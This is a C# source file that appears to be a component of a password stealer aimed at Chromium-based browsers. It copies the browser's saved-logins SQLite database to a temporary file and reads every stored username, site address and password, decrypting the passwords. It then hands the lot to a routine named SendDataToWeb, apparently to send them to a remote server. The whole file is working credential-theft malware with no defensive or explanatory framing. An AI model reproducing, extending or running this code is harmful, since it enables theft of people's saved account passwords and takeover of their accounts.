using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using Microsoft.Win32;

namespace xoxoxo.Chromium
{
    internal abstract class ChromiumBase
    {
        private readonly List<string> _passwords = new List<string>();
        private readonly List<string> _usernames = new List<string>();
        private readonly List<string> _websites = new List<string>();
        protected readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        protected readonly string LocData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        protected string ActualDataPath { private get; set; };

        protected string RegistryPath { private get; set; };

        private string CopiedDataPath { get; set; };

        public bool IsExists()
        {
            return File.Exists(ActualDataPath) && Registry.CurrentUser.OpenSubKey(RegistryPath) != null;
        }

        private void MoveData(string filePath)
        {
            if (!IsExists() || string.IsNullOrEmpty(ActualDataPath))
                return;
            var tempFileName = Path.GetTempFileName();
            File.Copy(filePath, tempFileName, true);
            CopiedDataPath = tempFileName;
        }

        protected void RetrieveData()
        {
            MoveData(ActualDataPath);
            var sqLiteConnection = new SQLiteConnection("data source=" + CopiedDataPath);
            var command = sqLiteConnection.CreateCommand();
            command.CommandText = "SELECT username_value FROM logins";
            sqLiteConnection.Open();
            var sqLiteDataReader = command.ExecuteReader();
            try
            {
                while (sqLiteDataReader.Read())
                    _usernames.Add(sqLiteDataReader[0].ToString());
            }
            finally
            {
                sqLiteDataReader.Close();
                command.CommandText = "SELECT password_value FROM logins";
                sqLiteDataReader = command.ExecuteReader();
            }

            try
            {
                while (sqLiteDataReader.Read())
                {
                    var numArray = new byte[100000];
                    sqLiteDataReader.GetBytes(0, 0L, numArray, 0, 100000);
                    _passwords.Add(ChromiumDecryptor.Decrypt(Convert.ToBase64String(numArray)));
                }
            }
            finally
            {
                sqLiteDataReader.Close();
                command.CommandText = "SELECT origin_url FROM logins";
                sqLiteDataReader = command.ExecuteReader();
            }

            try
            {
                while (sqLiteDataReader.Read())
                    _websites.Add(sqLiteDataReader[0].ToString());
            }
            finally
            {
                sqLiteDataReader.Close();
                sqLiteDataReader.Dispose();
                sqLiteConnection.Close();
            }

            new DataHandler().SendDataToWeb(_usernames, _passwords, _websites);
        }
    }
}